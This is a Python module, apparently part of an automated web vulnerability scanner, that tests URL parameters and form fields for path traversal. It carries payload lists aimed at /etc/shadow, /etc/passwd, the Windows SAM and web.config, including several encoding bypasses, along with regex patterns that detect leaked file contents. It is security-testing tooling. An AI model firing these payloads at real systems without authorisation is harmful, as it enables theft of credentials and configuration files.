from typing import Dict, List, Any, Optional
from playwright.async_api import Page
import asyncio
import re

from .base_tester import BaseTester

class PathTraversalTester(BaseTester):
    """目录穿越漏洞测试模块"""
    
    def __init__(self, agent):
        super().__init__(agent)
        self.name = "path_traversal"
        self.description = "目录穿越漏洞测试"
        self.payloads = {
            "unix": [
                "../../../etc/passwd",
                "../../../etc/hosts",
                "../../../../etc/passwd",
                "../../../../etc/shadow",
                "../../../etc/issue",
                "../../../proc/self/environ",
                "../../../var/log/auth.log",
                "../../../var/log/apache2/access.log",
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "....//....//....//etc/passwd",
                "../../../etc/passwd%00",
                "../../../etc/passwd",
                "..////..////..////..////etc///passwd"
            ],
            "windows": [
                "..\\..\\..\\windows\\system.ini",
                "..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\boot.ini",
                "..\\..\\..\\Windows\\repair\\SAM",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\windows\\debug\\NetSetup.log",
                "..\\..\\..\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\version.aspx",
                "..\\..\\..\\inetpub\\wwwroot\\global.asa",
                "..%5c..%5c..%5cwindows%5cwin.ini",
                "..%252f..%252f..%252fwindows%252fwin.ini",
                "..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini"
            ],
            "aspx": [
                "../../web.config",
                "../web.config",
                "../../app.config"
            ],
            "jsp": [
                "../../WEB-INF/web.xml",
                "../WEB-INF/web.xml",
                "../../../WEB-INF/web.xml"
            ],
            "source": [
                "../../index.php",
                "../index.php",
                "../../app.py",
                "../app.py",
                "../server.js",
                "../../server.js"
            ]
        }
        self.sensitive_content_patterns = {
            "unix": [
                r"root:.*:0:0:",  # /etc/passwd
                r"Host.*localhost",  # /etc/hosts
                r"GNU/Linux",  # /etc/issue
                r"HTTP_USER_AGENT",  # /proc/self/environ
                r"Failed password",  # auth.log
                r"GET /.*HTTP/1"  # apache logs
            ],
            "windows": [
                r"\[fonts\]",  # win.ini
                r"\[boot loader\]",  # boot.ini
                r"\[system\]",  # system.ini
                r"127\.0\.0\.1\s+localhost",  # hosts file
                r"Default Paths for NetSetup Logs",  # NetSetup.log
                r"DPAPI",  # SAM files
                r"IIS configuration file"  # asa/aspx files
            ],
            "web_configs": [
                r"<configuration>",
                r"<connectionStrings>",
                r"<system.web>",
                r"<appSettings>",
                r"<web-app",
                r"<servlet-mapping"
            ],
            "source_code": [
                r"<?php",
                r"<\?php",
                r"import os",
                r"using System;",
                r"namespace",
                r"function",
                r"const express = require",
                r"public class",
                r"private"
            ]
        }
        self.path_parameter_patterns = [
            r"(?:^|&|\?)(?:path|file|doc|page|filename|filepath|load|url|download|dir|show|view|include)=([^&]*)",
            r"(?:^|&|\?)(?:img|image|src|dest|destination|redirect|uri|target|site)=([^&]*)"
        ]
        self.vulnerable_params = []
    
    async def test(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """执行目录穿越漏洞测试"""
        self.test_results["status"] = "running"
        
        page = self.agent.page
        if not page:
            self.test_results["status"] = "error"
            self.record_test_result({
                "step": "init",
                "status": "error",
                "message": "浏览器页面未初始化"
            })
            return self.get_test_results()
        
        # 记录开始测试
        self.record_test_result({
            "step": "start",
            "status": "info",
            "message": f"开始目录穿越漏洞测试，目标URL: {page.url}"
        })
        
        # 1. 分析URL，查找可能的文件/路径参数
        current_url = page.url
        url_params = await self._extract_url_params(current_url)
        
        self.record_test_result({
            "step": "url_analysis",
            "status": "info",
            "message": f"URL参数分析: 发现 {len(url_params)} 个可能的路径参数"
        })
        
        # 2. 测试URL参数
        url_vulnerable_params = await self._test_url_params(page, url_params)
        
        # 3. 收集输入点
        input_points = await self.collect_input_points(page)
        
        if not input_points and not url_params:
            self.record_test_result({
                "step": "input_collection",
                "status": "warning",
                "message": "未发现任何输入点或URL参数"
            })
            self.test_results["status"] = "no_input_points"
            return self.get_test_results()
        
        self.record_test_result({
            "step": "input_collection",
            "status": "success",
            "message": f"发现 {len(input_points)} 个可能的输入点"
        })
        
        # 4. 测试表单输入点
        form_vulnerable_inputs = await self._test_form_inputs(page, input_points)
        
        # 合并可能的漏洞结果
        all_vulnerable = url_vulnerable_params + form_vulnerable_inputs
        
        # 更新测试状态
        if all_vulnerable:
            self.test_results["status"] = "vulnerable"
            self.record_test_result({
                "step": "summary",
                "status": "warning",
                "message": f"发现 {len(all_vulnerable)} 个存在目录穿越漏洞的输入点"
            })
        else:
            self.test_results["status"] = "secure"
            self.record_test_result({
                "step": "summary",
                "status": "success",
                "message": "未发现目录穿越漏洞"
            })
        
        return self.get_test_results()
    
    async def _extract_url_params(self, url: str) -> List[Dict[str, str]]:
        """从URL中提取可能与文件路径相关的参数"""
        params = []
        
        for pattern in self.path_parameter_patterns:
            matches = re.finditer(pattern, url, re.IGNORECASE)
            for match in matches:
                param_name = match.group(0).split('=')[0].strip('?&')
                param_value = match.group(1)
                params.append({
                    "name": param_name,
                    "value": param_value,
                    "url": url
                })
        
        return params
    
    async def _test_url_params(self, page: Page, params: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        """测试URL参数中是否存在目录穿越漏洞"""
        vulnerable_params = []
        
        for idx, param in enumerate(params):
            param_name = param["name"]
            original_url = param["url"]
            base_url = original_url.split('?')[0]
            
            self.record_test_result({
                "step": f"testing_url_param_{idx}",
                "status": "info",
                "message": f"正在测试URL参数: {param_name}"
            })
            
            # 尝试判断是Windows还是Unix系统
            os_type = await self._detect_os_type(page)
            
            # 选择适当的payload
            payloads = self.payloads["unix"]
            if os_type == "windows":
                payloads = self.payloads["windows"]
            
            # 将其他可能的配置文件添加到测试中
            payloads = payloads + self.payloads["aspx"] + self.payloads["jsp"] + self.payloads["source"]
            
            for payload in payloads:
                # 构建新的URL
                modified_url = self._replace_param_in_url(original_url, param_name, payload)
                
                # 访问修改后的URL
                try:
                    await page.goto(modified_url, timeout=5000)
                    await asyncio.sleep(1)  # 等待页面加载
                    
                    # 获取页面内容
                    content = await self.get_page_text(page)
                    
                    # 检查是否获取到敏感内容
                    is_vulnerable, content_type = self._check_sensitive_content(content)
                    
                    if is_vulnerable:
                        vulnerable_params.append({
                            "param_name": param_name,
                            "payload": payload,
                            "url": modified_url,
                            "content_type": content_type
                        })
                        
                        self.record_test_result({
                            "step": f"testing_url_param_{idx}_{payload}",
                            "status": "warning",
                            "message": f"发现目录穿越漏洞，参数: {param_name}, 载荷: {payload}, 内容类型: {content_type}"
                        })
                        
                        # 记录漏洞
                        self.record_vulnerability({
                            "param_name": param_name,
                            "vulnerability": "path_traversal",
                            "url": modified_url,
                            "payload": payload,
                            "content_type": content_type,
                            "details": f"URL参数 {param_name} 存在目录穿越漏洞，可访问: {content_type} 类型文件"
                        })
                        
                        # 只要发现一个有效的漏洞，就停止当前参数的测试
                        break
                except Exception as e:
                    # 忽略超时和导航错误
                    pass
                finally:
                    # 返回到原始页面
                    try:
                        await page.goto(original_url)
                        await asyncio.sleep(1)
                    except:
                        pass
        
        return vulnerable_params
    
    async def _test_form_inputs(self, page: Page, input_points: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """测试表单输入是否存在目录穿越漏洞"""
        vulnerable_inputs = []
        
        for idx, input_point in enumerate(input_points):
            # 跳过不适合路径穿越的输入类型
            if input_point["type"] in ["checkbox", "radio", "button", "image", "submit", "hidden"]:
                continue
                
            # 只测试可能与文件路径相关的输入
            name = input_point.get("name", "").lower()
            id_attr = input_point.get("id", "").lower()
            
            # 检查输入名称是否与文件路径相关
            if not any(term in name or term in id_attr for term in ["file", "path", "doc", "upload", "load", "include", "read", "get", "fetch", "image", "img"]):
                continue
                
            selector = input_point["selector"]
            
            self.record_test_result({
                "step": f"testing_input_{idx}",
                "status": "info",
                "message": f"正在测试输入点: {input_point.get('name', '') or input_point.get('id', '') or selector}"
            })
            
            # 尝试判断是Windows还是Unix系统
            os_type = await self._detect_os_type(page)
            
            # 选择适当的payload
            payloads = self.payloads["unix"]
            if os_type == "windows":
                payloads = self.payloads["windows"]
            
            # 每种类型只测试几个有代表性的payload
            test_payloads = payloads[:4] + self.payloads["source"][:2]
            
            original_content = await self.get_page_text(page)
            
            for payload in test_payloads:
                # 输入并提交表单
                await self._input_and_submit(page, selector, payload)
                await asyncio.sleep(1)  # 等待页面响应
                
                # 获取响应内容
                response_content = await self.get_page_text(page)
                
                # 检查是否获取到敏感内容
                is_vulnerable, content_type = self._check_sensitive_content(response_content, original_content)
                
                if is_vulnerable:
                    vulnerable_inputs.append({
                        "input_point": input_point,
                        "payload": payload,
                        "content_type": content_type
                    })
                    
                    self.record_test_result({
                        "step": f"testing_input_{idx}_{payload}",
                        "status": "warning",
                        "message": f"发现目录穿越漏洞，输入: {input_point.get('name', '')}, 载荷: {payload}, 内容类型: {content_type}"
                    })
                    
                    # 记录漏洞
                    self.record_vulnerability({
                        "input_point": input_point,
                        "vulnerability": "path_traversal",
                        "payload": payload,
                        "content_type": content_type,
                        "details": f"表单输入 {input_point.get('name', '')} 存在目录穿越漏洞，可访问: {content_type} 类型文件"
                    })
                    
                    # 只要发现一个有效的漏洞，就停止当前输入的测试
                    break
                
                # 返回到原始页面
                try:
                    await page.go_back()
                    await asyncio.sleep(1)
                except:
                    pass
        
        return vulnerable_inputs
    
    def _check_sensitive_content(self, content: str, original_content: str = "") -> tuple[bool, str]:
        """检查页面内容中是否包含敏感文件的特征"""
        # 确保内容与原始内容不同
        if original_content and content == original_content:
            return False, ""
        
        # 遍历所有敏感内容模式
        for content_type, patterns in self.sensitive_content_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True, content_type
        
        return False, ""
    
    def _replace_param_in_url(self, url: str, param_name: str, new_value: str) -> str:
        """替换URL中指定参数的值"""
        # 如果参数包含?或&，只获取真实的参数名
        clean_param_name = param_name.lstrip('?&')
        
        # 处理参数名可能包含=的情况
        if '=' in clean_param_name:
            clean_param_name = clean_param_name.split('=')[0]
        
        # 拆分URL和查询字符串
        if '?' in url:
            base_url, query_string = url.split('?', 1)
        else:
            base_url = url
            query_string = ""
        
        # 如果没有查询字符串，直接添加新参数
        if not query_string:
            return f"{base_url}?{clean_param_name}={new_value}"
        
        # 替换现有参数
        params = []
        for param in query_string.split('&'):
            if '=' in param:
                name, value = param.split('=', 1)
                if name == clean_param_name:
                    params.append(f"{name}={new_value}")
                else:
                    params.append(param)
            else:
                params.append(param)
        
        return f"{base_url}?{'&'.join(params)}"
    
    async def _detect_os_type(self, page: Page) -> str:
        """尝试检测目标系统的操作系统类型"""
        # 检查URL和服务器响应头中的线索
        headers = {}
        try:
            # 尝试获取服务器响应头
            response = await page.evaluate("""
            async () => {
                try {
                    const resp = await fetch(window.location.href, {method: 'HEAD'});
                    const headers = {};
                    resp.headers.forEach((value, name) => {
                        headers[name.toLowerCase()] = value;
                    });
                    return headers;
                } catch (e) {
                    return {};
                }
            }
            """)
            
            if isinstance(response, dict):
                headers = response
        except:
            pass
        
        # 1. 检查Server头
        server_header = headers.get('server', '').lower()
        
        if any(win_term in server_header for win_term in ['microsoft', 'iis', 'windows']):
            return "windows"
        
        if any(unix_term in server_header for unix_term in ['apache', 'nginx', 'unix', 'debian', 'ubuntu', 'centos']):
            return "unix"
        
        # 2. 检查URL路径分隔符
        current_url = page.url.lower()
        
        if '\\' in current_url or '%5c' in current_url:
            return "windows"
        
        # 3. 检查常见Windows和Unix路径格式
        if re.search(r'(?:/var/|/etc/|/usr/|/home/)', current_url):
            return "unix"
            
        if re.search(r'(?:c:|d:|e:|\w:\\|\w:%5c)', current_url, re.IGNORECASE):
            return "windows"
        
        # 默认使用Unix
        return "unix"
    
    async def _input_and_submit(self, page: Page, selector: str, value: str) -> None:
        """输入内容并提交表单"""
        try:
            # 清除原有内容
            await page.fill(selector, "")
            # 输入新内容
            await page.fill(selector, value)
            
            # 查找可能的提交按钮
            form = await page.query_selector(f"{selector} >> xpath=ancestor::form")
            
            if form:
                # 如果输入在表单中，查找表单的提交按钮
                submit_button = await form.query_selector('input[type="submit"], button[type="submit"], button:has-text("Submit"), button')
                if submit_button:
                    await submit_button.click()
                    return
            
            # 如果没有找到提交按钮，尝试按回车键
            await page.press(selector, "Enter")
            
        except Exception as e:
            # 忽略错误，表单提交可能会导致页面跳转
            pass
    
    async def verify_vulnerability(self, page: Page, input_selector: str = None, payload: str = None, url: str = None) -> Dict[str, Any]:
        """验证特定输入点或URL是否存在目录穿越漏洞"""
        result = {
            "vulnerable": False,
            "details": "",
            "content_type": "",
            "payload": payload
        }
        
        original_content = ""
        
        try:
            if url:
                # 验证URL参数漏洞
                original_url = page.url
                
                # 保存原始内容
                original_content = await self.get_page_text(page)
                
                # 访问测试URL
                await page.goto(url, timeout=5000)
                await asyncio.sleep(1)
                
                # 获取响应内容
                response_content = await self.get_page_text(page)
                
                # 检查是否获取到敏感内容
                is_vulnerable, content_type = self._check_sensitive_content(response_content, original_content)
                
                if is_vulnerable:
                    result["vulnerable"] = True
                    result["details"] = f"验证成功，URL参数存在目录穿越漏洞"
                    result["content_type"] = content_type
                
                # 返回到原始页面
                await page.goto(original_url)
                await asyncio.sleep(1)
                
            elif input_selector and payload:
                # 验证表单输入漏洞
                
                # 保存原始内容
                original_content = await self.get_page_text(page)
                
                # 输入并提交表单
                await self._input_and_submit(page, input_selector, payload)
                await asyncio.sleep(1)  # 等待页面响应
                
                # 获取响应内容
                response_content = await self.get_page_text(page)
                
                # 检查是否获取到敏感内容
                is_vulnerable, content_type = self._check_sensitive_content(response_content, original_content)
                
                if is_vulnerable:
                    result["vulnerable"] = True
                    result["details"] = f"验证成功，表单输入存在目录穿越漏洞"
                    result["content_type"] = content_type
                
                # 返回到原始页面
                await page.go_back()
                await asyncio.sleep(1)
        except Exception as e:
            result["details"] = f"验证过程中发生错误: {str(e)}"
        
        return result 